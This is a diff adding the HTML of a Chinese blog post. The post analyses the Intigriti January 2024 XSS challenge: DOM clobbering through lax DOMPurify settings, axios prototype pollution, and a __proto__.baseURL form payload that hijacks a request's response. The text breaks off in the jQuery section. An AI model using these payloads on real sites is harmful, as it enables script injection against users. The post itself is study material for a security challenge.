@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言好久没做做xss了，当然与其说做，其实也就是看看大佬咋打的，思路如何产生，见识更多的打法，个人感觉xss的打法挺有美感的hh，怪不得老外这么喜欢 这里看一道题，详见  https:&#x2F;&#x2F;mizu.re&#x2F;post&#x2F;intigriti-january-2024-xss-challenge  解法很多人写了，都可以看看 学习这道题是有附件的：https:&#x2F;&#x2F;challenge-0124.intigri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次典型xss的多漏洞利用链">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言好久没做做xss了，当然与其说做，其实也就是看看大佬咋打的，思路如何产生，见识更多的打法，个人感觉xss的打法挺有美感的hh，怪不得老外这么喜欢 这里看一道题，详见  https:&#x2F;&#x2F;mizu.re&#x2F;post&#x2F;intigriti-january-2024-xss-challenge  解法很多人写了，都可以看看 学习这道题是有附件的：https:&#x2F;&#x2F;challenge-0124.intigri">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-08T10:46:19.000Z">
+<meta property="article:modified_time" content="2025-12-08T10:47:32.613Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="原型链污染">
+<meta property="article:tag" content="供应链安全">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一次典型xss的多漏洞利用链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E5%8D%8E%E5%A4%8Ferp%E6%9C%AA%E6%8E%88%E6%9D%83rce-%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&text=一次典型xss的多漏洞利用链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=一次典型xss的多漏洞利用链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次典型xss的多漏洞利用链&body=Check out this article: https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&name=一次典型xss的多漏洞利用链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&t=一次典型xss的多漏洞利用链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#axios"><span class="toc-number">2.1.</span> <span class="toc-text">axios</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jquery"><span class="toc-number">2.2.</span> <span class="toc-text">jquery</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E6%B3%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">打法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E8%A7%88"><span class="toc-number">2.3.</span> <span class="toc-text">总览</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        一次典型xss的多漏洞利用链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-12-08T10:46:19.000Z" class="dt-published" itemprop="datePublished">2025-12-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/xss/">xss</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8/" rel="tag">供应链安全</a>, <a class="p-category" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">原型链污染</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久没做做xss了，当然与其说做，其实也就是看看大佬咋打的，思路如何产生，见识更多的打法，个人感觉xss的打法挺有美感的hh，怪不得老外这么喜欢</p>
+<p>这里看一道题，详见</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mizu.re/post/intigriti-january-2024-xss-challenge">https://mizu.re/post/intigriti-january-2024-xss-challenge</a></li>
+</ul>
+<p>解法很多人写了，都可以看看</p>
+<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>这道题是有附件的：<a target="_blank" rel="noopener" href="https://challenge-0124.intigriti.io/">https://challenge-0124.intigriti.io/</a></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- include(<span class="string">&quot;inc/header&quot;</span>); %&gt;</span><br><span class="line">&lt;h2&gt;Hey &lt;%- name %&gt;,&lt;br&gt;Which repo are you looking <span class="keyword">for</span>?&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=<span class="string">&quot;search&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;q&quot;</span> value=<span class="string">&quot;&lt;%= search %&gt;&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;/static/img/loading.gif&quot;</span> class=<span class="string">&quot;loading&quot;</span> width=<span class="string">&quot;50px&quot;</span> hidden&gt;&lt;br&gt;</span><br><span class="line">&lt;img class=<span class="string">&quot;avatar&quot;</span> width=<span class="string">&quot;35%&quot;</span>&gt;</span><br><span class="line">&lt;p id=<span class="string">&quot;description&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;iframe id=<span class="string">&quot;homepage&quot;</span> hidden&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">&quot;/static/js/axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;/static/js/jquery-3.7.1.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function <span class="title function_">search</span><span class="params">(name)</span> &#123;</span><br><span class="line">        $(<span class="string">&quot;img.loading&quot;</span>).attr(<span class="string">&quot;hidden&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        axios.post(<span class="string">&quot;/search&quot;</span>, $(<span class="string">&quot;#search&quot;</span>).get(<span class="number">0</span>), &#123;</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;</span><br><span class="line">        &#125;).then((d) =&gt; &#123;</span><br><span class="line">            $(<span class="string">&quot;img.loading&quot;</span>).attr(<span class="string">&quot;hidden&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="type">const</span> <span class="variable">repo</span> <span class="operator">=</span> d.data;</span><br><span class="line">            <span class="keyword">if</span> (!repo.owner) &#123;</span><br><span class="line">                alert(<span class="string">&quot;Not found!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            $(<span class="string">&quot;img.avatar&quot;</span>).attr(<span class="string">&quot;src&quot;</span>, repo.owner.avatar_url);</span><br><span class="line">            $(<span class="string">&quot;#description&quot;</span>).text(repo.description);</span><br><span class="line">            <span class="keyword">if</span> (repo.homepage &amp;&amp; repo.homepage.startsWith(<span class="string">&quot;https://&quot;</span>)) &#123;</span><br><span class="line">                $(<span class="string">&quot;#homepage&quot;</span>).attr(&#123;</span><br><span class="line">                    <span class="string">&quot;src&quot;</span>: repo.homepage,</span><br><span class="line">                    <span class="string">&quot;hidden&quot;</span>: <span class="literal">false</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    window.onload = () =&gt; &#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.search);</span><br><span class="line">        <span class="keyword">if</span> (params.get(<span class="string">&quot;search&quot;</span>)) search();</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&quot;#search&quot;</span>).submit((e) =&gt; &#123;</span><br><span class="line">            e.preventDefault();</span><br><span class="line">            search();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">createDOMPurify</span> <span class="operator">=</span> require(<span class="string">&quot;dompurify&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">repos</span> <span class="operator">=</span> require(<span class="string">&quot;./repos.json&quot;</span>);</span><br><span class="line">const &#123; JSDOM &#125; = require(<span class="string">&quot;jsdom&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">express</span> <span class="operator">=</span> require(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">path</span> <span class="operator">=</span> require(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// App config</span></span><br><span class="line"><span class="type">const</span> <span class="variable">app</span>  <span class="operator">=</span> express();</span><br><span class="line">app.set(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;ejs&quot;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;view cache&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">app.use(express.json());</span><br><span class="line"><span class="type">const</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">window</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSDOM</span>(<span class="string">&quot;&quot;</span>).window;</span><br><span class="line"><span class="type">const</span> <span class="variable">DOMPurify</span> <span class="operator">=</span> createDOMPurify(window);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middlewares</span></span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.<span class="keyword">static</span>(path.join(__dirname, <span class="string">&quot;static&quot;</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Routes</span></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.query.name) &#123;</span><br><span class="line">        res.render(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.render(<span class="string">&quot;search&quot;</span>, &#123;</span><br><span class="line">        name: DOMPurify.sanitize(req.query.name, &#123; SANITIZE_DOM: <span class="literal">false</span> &#125;),</span><br><span class="line">        search: req.query.search</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/search&quot;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    name = req.body.q;</span><br><span class="line">    repo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (let item of repos.items) &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.full_name &amp;&amp; item.full_name.includes(name)) &#123;</span><br><span class="line">            repo = item</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.json(repo);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run</span></span><br><span class="line">app.listen(PORT, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening on port $&#123;PORT&#125;!`)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这里对两个第三方库留个心眼，这里有供应链漏洞（类似的洞的poc可以去github上翻，总结下来不少）</p>
+<p>先进行我们的一层的理解~&#96;DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false })&#96;</p>
+<p>以前学过xss突变，但是感觉实际能考这个的比较少，这里用<code>DOMPurify.sanitize</code>+<code>SANITIZE_DOM: false</code>&#x3D;&gt; <code>DOMPurify 将不再拦截所有会更改 DOM 结构对象属性的危险标签属性</code></p>
+<p>这里我们就要意思到可html注入打<strong>“DOM Clobbering”</strong> ——一种通过 HTML 标签属性覆盖 Document 或元素属性的攻击方式。  </p>
+<p>举个例子，当我们简单<code>&lt;img name=&quot;body&quot;&gt;</code>&#x3D;&gt;<code>document.body 被替换成这个 image 元素</code></p>
+<p>也就是说出题人留了这么一个html注入的口子</p>
+<h3 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h3><p>axios这个第三方库干什么呢？</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中</span><br><span class="line">axios的作用是什么呢？</span><br><span class="line">axios主要是用于向后台发起请求的，还有在请求中做更多是可控功能。</span><br></pre></td></tr></table></figure></div>
+
+<p>这个第三方库会从一个 <code>&lt;form&gt;</code> DOM 元素读取 input name &amp; value，然后拼出一个 JSON 对象。  </p>
+<p>因为开发者不想再手写：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  username: document.querySelector(&quot;input[name=username]&quot;).value,</span><br><span class="line">  password: document.querySelector(&quot;input[name=password]&quot;).value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Axios 想帮你自动完成：</p>
+<p><strong>把 HTML Form → JSON Body 的过程自动化。</strong></p>
+<p>而这种表单&#x3D;&gt;json格式，如果不加以过滤的话，会产生原型链污染~</p>
+<p>这里有个小demo</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;f&quot;</span>&gt;</span><br><span class="line">  &lt;input name=<span class="string">&quot;__proto__[polluted]&quot;</span> value=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.3/axios.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">axios.formToJSON(document.getElementById(<span class="string">&quot;f&quot;</span>));</span><br><span class="line">alert((&#123;&#125;).polluted); <span class="comment">// 1 被污染</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>而且</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">axios.post(<span class="string">&quot;/search&quot;</span>, $(<span class="string">&quot;#search&quot;</span>).get(<span class="number">0</span>), &#123;</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;</span><br><span class="line">        &#125;).then((d) =&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>这里不经思考axios的baseurl是什么呢？</p>
+<p><code>(e=qe(this.defaults,e)).baseURL,e.url),e.</code>截取一截，确实存在</p>
+<p>这里可以html注入-&gt;原型链污染-&gt;控制serach的返回结果</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;search&quot;</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;__proto__.baseURL&quot;</span> value=<span class="string">&quot;data:,&#123;&#125;#&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>为什么用search包裹呢?</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#search&quot;</span>).submit((e) =&gt; &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line">    search();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>这里直接控制了返回结果！</p>
+<h3 id="jquery"><a href="#jquery" class="headerlink" title="jquery"></a>jquery</h3><p>jQuery是JavaScript的一个工具库，工具库就是指封装好的JavaScript函数，可以直接在程序中进行调用，那jQuery就是一款非常流行的JavaScript库。jQuery设计的宗旨是“写更少的代码，做更多的事情”。</p>
+<p>jQuery库封装了JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;img.loading&quot;</span>).attr(<span class="string">&quot;hidden&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">repo</span> <span class="operator">=</span> d.data;</span><br><span class="line"><span class="keyword">if</span> (!repo.owner) &#123;</span><br><span class="line">    alert(<span class="string">&quot;Not found!&quot;</span>);</span><br><span class="line">    <span 